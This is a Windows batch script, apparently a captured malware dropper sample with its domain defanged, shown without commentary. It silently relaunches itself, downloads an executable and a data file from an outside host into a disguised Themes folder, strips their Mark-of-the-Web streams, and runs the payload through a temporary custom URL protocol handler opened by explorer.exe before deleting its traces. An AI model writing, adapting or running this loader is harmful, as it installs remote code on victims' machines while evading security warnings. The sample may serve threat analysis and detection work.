@echo off
if "%~1"=="_h" goto :work
start "" /min cmd /c call "%~f0" _h
exit /b
:work
timeout /t 1 >nul
set "d=%APPDATA%\Microsoft\Windows\Themes"
set "l=%PUBLIC%\v.txt"
md "%d%" 2>nul
cd /d "%d%"
echo z>>"%l%"
del /q v.txt 2>nul
del /q vclreg.exe 2>nul
del /q vclx370.dat 2>nul
if exist vclreg.exe echo lockexe>>"%l%"
if exist vclx370.dat echo lockbpl>>"%l%"
curl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclreg.exe https://baseupdate2798[.]com/ue/x/1avyGp5x <nul
echo x%errorlevel%>>"%l%"
curl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclx370.dat https://baseupdate2798[.]com/ue/b/1avyGp5x <nul
echo b%errorlevel%>>"%l%"
del /q vclreg.exe:Zone.Identifier 2>nul
del /q vclx370.dat:Zone.Identifier 2>nul
ver >nul
>t echo 1avyGp5x baseupdate2798[.]com
if exist vclreg.exe echo exe>>"%l%"
if exist vclx370.dat echo bpl>>"%l%"
for %%f in (vclreg.exe vclx370.dat) do echo %%~zf>>"%l%"
if exist vclreg.exe if exist vclx370.dat (
reg add "HKCU\Software\Classes\vclimg" /f /ve /d "URL:vclimg" >nul
reg add "HKCU\Software\Classes\vclimg" /f /v "URL Protocol" /d "" >nul
reg add "HKCU\Software\Classes\vclimg\shell\open\command" /f /ve /t REG_SZ /d "\"%d%\vclreg.exe\" -q \"%d%\vclx370.dat\"" >nul
echo r%errorlevel%>>"%l%"
>"%TEMP%\t.url" echo [InternetShortcut]
>>"%TEMP%\t.url" echo URL=vclimg:x
%SystemRoot%\explorer.exe "%TEMP%\t.url"
)
echo s%errorlevel%>>"%l%"
timeout /t 1 >nul
reg delete "HKCU\Software\Classes\vclimg" /f >nul
del /q "%TEMP%\t.url" 2>nul
